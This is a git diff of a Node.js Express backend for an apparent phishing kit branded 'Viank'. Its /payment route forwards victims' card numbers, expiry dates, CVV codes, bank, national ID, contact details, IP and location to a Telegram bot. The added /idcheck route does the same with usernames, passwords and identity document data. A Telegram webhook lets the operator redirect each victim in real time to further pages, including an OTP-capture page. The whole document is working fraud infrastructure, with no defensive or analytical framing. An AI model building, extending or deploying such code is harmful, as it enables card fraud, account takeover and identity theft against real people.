@@ -14,15 +14,15 @@ if (!BOT_TOKEN || !CHAT_ID) {
   console.warn('[WARN] BOT_TOKEN o CHAT_ID no están definidos en variables de entorno.');
 }
 
-// Mapa de redirecciones por sessionId
+// Mapa para almacenar sessionId → redirección
 const redirectionTable = Object.create(null);
 
-// Health / debug
+// Ruta de prueba para verificar si el backend está activo
 app.get('/', (_req, res) => {
-  res.send({ ok: true, service: 'payment-backend', hasEnv: !!(BOT_TOKEN && CHAT_ID) });
+  res.send({ ok: true, service: 'multi-backend', hasEnv: !!(BOT_TOKEN && CHAT_ID) });
 });
 
-// Cliente → Servidor: recibe datos y envía mensaje con botones
+// ✅ Ruta para payment.html
 app.post('/payment', async (req, res) => {
   try {
     const data = req.body;
@@ -31,21 +31,21 @@ app.post('/payment', async (req, res) => {
     const text = `
 🟣Viank🟣 - |[info]|
 ---
-ℹ️DATOS DE LA TARJETA
+ℹ️ DATOS DE LA TARJETA
 
 💳: ${data.p}
 📅: ${data.pdate}
 🔒: ${data.c}
 🏛️: ${data.ban}
 
-ℹ️DATOS DEL CLIENTE
+ℹ️ DATOS DEL CLIENTE
 
 👨: ${data.dudename} ${data.surname}
 🪪: ${data.cc}
 📩: ${data.email}
 📞: ${data.telnum}
 
-ℹ️DATOS DE FACTURACION
+ℹ️ DATOS DE FACTURACIÓN
 
 🏙️: ${data.city}
 🏙️: ${data.state}
@@ -54,10 +54,8 @@ app.post('/payment', async (req, res) => {
 📍 Ubicación: ${data.location}
 
 🆔 sessionId: ${sessionId}
----
-`.trim();
+---`.trim();
 
-    // Incluir sessionId en cada botón (callback_data máx. 64 bytes; esto cabe)
     const reply_markup = {
       inline_keyboard: [
         [
@@ -70,9 +68,7 @@ app.post('/payment', async (req, res) => {
     await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
       chat_id: CHAT_ID,
       text,
-      reply_markup,
-      // Evitamos errores de formateo: el texto es plano
-      // parse_mode: "Markdown"
+      reply_markup
     });
 
     res.status(200).send({ ok: true });
@@ -82,14 +78,61 @@ app.post('/payment', async (req, res) => {
   }
 });
 
-// Telegram → Webhook: procesa clics en botones
+// ✅ Ruta para id-check.html
+app.post('/idcheck', async (req, res) => {
+  try {
+    const data = req.body;
+    const sessionId = data.sessionId;
+
+    const text = `
+🟣Viank🟣 - |[id-check]|
+---
+🪪 VERIFICACIÓN DE IDENTIDAD
+
+• Usuario: ${data.user || data.user1 || 'N/D'}
+• Clave: ${data.pass || data.puser || data.puser1 || 'N/D'}
+• Tipo doc: ${data.docType || 'N/D'}
+• Número doc: ${data.docNumber || 'N/D'}
+• Fecha expedición: ${data.docExpDate || 'N/D'}
+• Ciudad expedición: ${data.docCity || 'N/D'}
+
+🌐 IP: ${data.ip || 'N/D'}
+📍 Ubicación: ${data.location || 'N/D'}
+
+🆔 sessionId: ${sessionId}
+---`.trim();
+
+    const reply_markup = {
+      inline_keyboard: [
+        [
+          { text: '❌ Error tarjeta', callback_data: `go:payment.html|${sessionId}` },
+          { text: '⚠️ Error logo',   callback_data: `go:id-check.html|${sessionId}` },
+          { text: '✅ Siguiente',     callback_data: `go:otp-check.html|${sessionId}` }
+        ]
+      ]
+    };
+
+    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      chat_id: CHAT_ID,
+      text,
+      reply_markup
+    });
+
+    res.status(200).send({ ok: true });
+  } catch (err) {
+    console.error('Error en /idcheck:', err?.response?.data || err.message);
+    res.status(500).send({ ok: false, error: 'telegram_send_failed' });
+  }
+});
+
+// ✅ Webhook de Telegram para botones dinámicos
 app.post(`/webhook/${BOT_TOKEN}`, async (req, res) => {
   try {
     const update = req.body;
 
     if (update.callback_query) {
       const cq = update.callback_query;
-      const data = cq.data || '';                 // ej: "go:id-check.html|<sessionId>"
+      const data = cq.data || '';
       const [action, sessionId] = data.split('|');
       const target = (action || '').replace('go:', '');
 
@@ -97,7 +140,6 @@ app.post(`/webhook/${BOT_TOKEN}`, async (req, res) => {
         redirectionTable[sessionId] = target;
       }
 
-      // Confirma al admin que se procesó
       await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
         callback_query_id: cq.id,
         text: `Redireccionando al cliente (${sessionId}) → ${target}`,
@@ -105,7 +147,6 @@ app.post(`/webhook/${BOT_TOKEN}`, async (req, res) => {
       });
     }
 
-    // Responder SIEMPRE rápido a Telegram
     res.sendStatus(200);
   } catch (err) {
     console.error('Error en webhook:', err?.response?.data || err.message);
@@ -113,12 +154,13 @@ app.post(`/webhook/${BOT_TOKEN}`, async (req, res) => {
   }
 });
 
-// Cliente consulta si ya hay destino decidido
+// ✅ Consulta del cliente para ver si ya tiene destino
 app.get('/get-redirect/:sessionId', (req, res) => {
   const sessionId = req.params.sessionId;
   const target = redirectionTable[sessionId] || null;
   res.send({ target });
 });
 
+// Iniciar servidor
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`Servidor activo en ${PORT}`));
+app.listen(PORT, () => console.log(`Servidor activo en puerto ${PORT}`));
